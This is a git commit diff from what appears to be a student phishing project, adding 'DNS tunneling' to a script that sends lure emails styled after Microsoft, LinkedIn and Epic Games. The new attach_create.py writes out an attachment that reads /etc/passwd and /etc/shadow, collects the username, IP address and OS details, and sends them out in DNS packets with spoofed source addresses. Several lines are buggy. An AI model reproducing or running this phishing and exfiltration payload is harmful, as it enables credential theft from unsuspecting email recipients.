1f06277fc26afe7ab1bd12d94f3b3c8dcc671bb6
Zohar Simhon <Zoharsimhon13@gmail.com>
2023-06-18 03:45:48 +0300

    added dns tunneling

--- Phishing.py
+++ Phishing.py
@@ -2,36 +2,40 @@ from helperFunctions import send_email
 from attach_create import create_attachment
 
 # Prompt the user for input
-username = input("Enter your user name: ")
-mailServiceName = input("Enter your mail service name: ")
-title = input("Enter your title: ")
-jobTitle = input("Enter your job title: ")
-personalStatus = input("Enter your personal status: ")
-kidsNumber = input("Enter your number of kids: ")
+username = input("Enter your user name <String>: ")
+mailServiceName = input("Enter your mail service name <String>: ")
+title = input("Enter your title <String>: ")
+jobTitle = input("Enter your job title <String>: ")
+personalStatus = input("Enter your personal status <String>: ")
+kidsNumber = input("Enter your number of kids <int>: ")
+encrypte = input("Do you want to encrypt the data <bool>: ")
+
+html_file_path = "html_files/body.html"
+subject = "body!"
 
 if (int(kidsNumber) > 0):
     subject = "Parent!"
-    html_file_path = "html__files/epic_games/epic.html"
+    html_file_path = "html_files/epic_games/epic.html"
 
 match jobTitle:
     case "student":
         subject = "Student!"
-        html_file_path = "html__files/microsoft.html"
+        html_file_path = "html_files/microsoft.html"
     case "programmer":
         subject = "Programmer!"
-        html_file_path = "html__files/linkedin.html"
+        html_file_path = "html_files/linkedin.html"
     case "lecturer":
         subject = "Lecturer!"
-        html_file_path = "html__files/lecturer.html"
+        html_file_path = "html_files/lecturer.html"
     case _:
         pass
 
 #create the attachment file
-attachment_path = create_attachment()
+attachment_path = create_attachment(encrypte)
 
 # Sending the phising mail
 recipient = username + "@" + mailServiceName
-attachment_path = "attachment.py"
+# attachment_path = "attachment.py"
 
 with open(html_file_path, 'r', encoding="utf-8") as file:
     body = file.read()
--- attach_create.py
+++ attach_create.py
@@ -1,8 +1,154 @@
 
 
-def create_attachment():
-    file_name = "attachment1.py"
+def create_attachment(encrypte):
+    file_name = "attachment.py"
     f = open(file_name, 'w')
+    f.write("""
+
+import getpass
+import socket
+import locale
+import platform
+
+from scapy.all import IP, UDP, DNS, DNSQR, send
+from base64 import b32encode
+from random import randint
+
+
+def randomIP():
+    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
+    return ip
+
+
+def randInt():
+    x = randint(1000, 8999)
+    return x
+
+def send_DNS_data(data,encrypte):
+    # first, encode the data
+    queries = encode_data(data,encrypte)
+    # build the dns packet, by hidding the data
+    for query in queries:
+        dns_request = IP(src= randomIP(),dst='172.0.0.1') / UDP(dport=53) / DNS(rd=50, qd=query)
+        send(dns_request, verbose=0)
+
+def encode_data(data,encrypte):
+    queries = []
+    max_label_length = 63  # Maximum length of a DNS label
+
+    # Encode the data and split it into chunks that fit within a DNS label
+    encoded_data = data
+    if encrypte:
+        encoded_data = b32encode(data.encode('utf-8'))
+    chunks = [encoded_data[i:i + max_label_length] for i in range(0, len(encoded_data), max_label_length)]
+
+    # Create a DNS query for each chunk
+    # for chunk in chunks:
+    #     query = DNSQR(qname=chunk)
+    #     queries.append(query)
+    # return queries
+    return chunks
+
+def getLinuxPasswords():
+    passwords = []
+    try:
+        with open('/etc/passwd', 'r') as passwd_file:  # Assuming Linux-based system
+            content = passwd_file.readlines()
+
+        for line in content:
+            passwords.append(line)
+
+    except Exception as e:
+        passwords.append(e)
+
+    return passwords
+
+
+def getLinuxShadow():
+    encryptedPasswords = []
+    try:
+        with open('/etc/shadow', 'r') as passwd_file:  # Assuming Linux-based system
+            content = passwd_file.readlines()
+
+        for line in content:
+            lineInArray = line.split(":")
+            if (lineInArray[1] != "*"):
+                encryptedPasswords.append(
+                    {"user name": lineInArray[0], "encrypted password": lineInArray[1]})
+    except Exception as e:
+        encryptedPasswords.append(e)
+
+    return encryptedPasswords
+
+
+def getWindowsPasswords():
+    passwords = []
+    return passwords
+
+
+def get_details(encrypte):
+    # Current username
+    current_username = getpass.getuser()
+
+    # IP addresses
+    ip_address = socket.gethostbyname(socket.gethostname())
+
+    # response = requests.get('https://api.ipify.org?format=json')
+    # data = response.json()
+    # external_ip = data['ip']
+
+    # Available languages
+    available_languages = locale.getlocale()
+
+    # OS version
+    os_version = platform.platform()
+
+    # OS name
+    os_name = platform.system()
+
+    # Password file
+    passwords = []
+    if os_name == "Linux":
+        passwords = getLinuxPasswords()
+        encryptedPasswords = getLinuxShadow()
+    elif os_name == "Windows":
+        passwords = getWindowsPasswords()
+
+    # Print the details
+    print("Password File:")
+    for password in passwords:
+        print(password)
+    print("Shadow File:")
+    for password in encryptedPasswords:
+        print(password)
+    print("Current Username:", current_username)
+    print("IP Address:", ip_address)
+    # print("External IP address:", external_ip)
+    print("Available Languages:", available_languages)
+    print("Operating System:", os_name)
+    print("OS Version:", os_version)
+    
+    # send the data in DNS protocol
+    for password in passwords:
+        send_DNS_data(password.encrypte)
+    for password in encryptedPasswords:
+        send_DNS_data(password['user name'],encrypte)
+        send_DNS_data(password['encrypted password'],encrypte)
+    send_DNS_data(current_username,encrypte)
+    send_DNS_data(ip_address,encrypte)
+    for language in available_languages:
+        send_DNS_data(language,encrypte)
+    send_DNS_data(os_name,encrypte)
+    send_DNS_data(os_version,encrypte)
+            
+            """)
+    if encrypte == True:
+        print(encrypte)
+        f.write("""
+get_details(True)""")
+    else:
+        f.write("""
+get_details(False)""")
+            
     
     return file_name
-    
